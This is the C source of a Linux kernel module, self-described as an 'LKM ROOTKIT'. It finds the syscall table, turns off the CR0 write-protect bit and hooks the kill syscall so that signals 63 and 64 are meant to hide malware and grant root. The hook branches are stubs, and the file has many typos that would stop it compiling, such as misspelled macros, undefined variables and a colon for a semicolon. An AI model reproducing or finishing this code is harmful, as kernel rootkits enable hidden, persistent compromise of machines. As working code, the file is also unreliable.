#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <asm/paravirt.h>
#include <linux/dirent.h>

MODULE_LICENSE("GPL v2");

MODULE_AUTHOR("NEHA");
MODULE_DESCRIPTION("LKM ROOTKIT");
MODULE_VERSION("0.0.1");

unsigned long *__sys_call_table;


#ifdef CONFIG_x86_64
#if LINX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
#define PTREGS_SYSCALL_STUB 1
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
#else
typedef asmlinkage long(*orig_kill_t)(pid_t pid, int sig);
static org_kill_t orig_kill;
#endif
#endif

enum signals {
        SIGSUPER =64,
        SIGINVIS = 63,
};



#if PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs)
{
        int sig = rigs->si;

        if (sig ==SIGSUPER){
                printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root ", sig,SIGSUPER);
                return 0;
        }else if (sig == SIGINVIS){
                printk(KERN_INFO "signal:%d == SIGINVIS: %d | hide itself/malware/etc", sig, SIGINVIS);
                return 0;
        }
        printk(KERN_INFO "hacked kill syscall \n");
        return org_kill(regs);
}

#else

static asmlinkage long hack_kill(pid_t pid, int sig)
{
        if (sig ==SIGSUPER){
                printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root ", sig,SIGSUPER);
                return 0;
        }else if (sig == SIGINVIS){
                printk(KERN_INFO "signal:%d == SIGINVIS: %d | hide itself/malware/etc", sig, SIGINVIS);
                return 0;
        }
        printk(KERN_INFO "hacked kill syscall \n");
        return org_kill(regs);

}

#endif
static int cleanup(void)
{
        __sys_call_table[__NR_kill] =(unsigned long) orig_kill;
        return 0;
}

static int store(void)
{
#if PTREGS_SYSCALL_STUB
        orig_kill =(ptregs_t)__sys_Call_table[__NR_kill];
        printk(KERN_INFO "org_kill table entry successfully stored\n");
#else
        org_kill =(org_kill_t)__sys_call_table[__NR_kill];
        printk(KERN_INFO "org_kill table entry successfully stored\n");

#endif
        return 0;
}


static int hook(void)
{
        __sys_call_table[__NR_kill] =(unsigned long) &hack_kill;

        return 0;
}



static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}
static void unprotect_memory(void)
{
    write_cr0_forced(read_cr0()  & (~0x10000));
    printk(KERN_INFO "unprotected memory\n");
}



static inline void protect_memory(void)
{
    write_cr0_forced(read_cr0() | (0x10000));
    printk(KERN_INFO "protected memory\n");
}





static unsigned long *get_syscall_table(void)
{
        unsigned long *syscall_table;

#if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)X
        syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table"):
#else
                syscall_table = NULL;
#endif
        return syscall_table;
}

static int __init mod_init(void)
{
        int err = 1;
        printk(KERN_INFO "rootkit: init\n");
        __sys_call_table = get_syscall_table();

        if (!__sys_call_table){
                printk(KERN_INFO "error: __sys_call_table == null");
                return err;
        }

        if (store()==err){
                printk(KERN_INFO "error:store error\n");
        }
        unprotect_memory();
        if (hook() == err){
                printk(KERN_INFO "error:hook error\n");
        }
        return 0;

}


static void __exit mod_exit(void)
{
        int err = 1;
        printk(KERN_INFO "rootkit:exit\n");

        unprotect_memory();
        if (cleanup()==err){
                printk(KERN_INFO "error: cleanup error\n");
        }
        protect_memory();


}

module_init(mod_init);
module_exit(mod_exit);
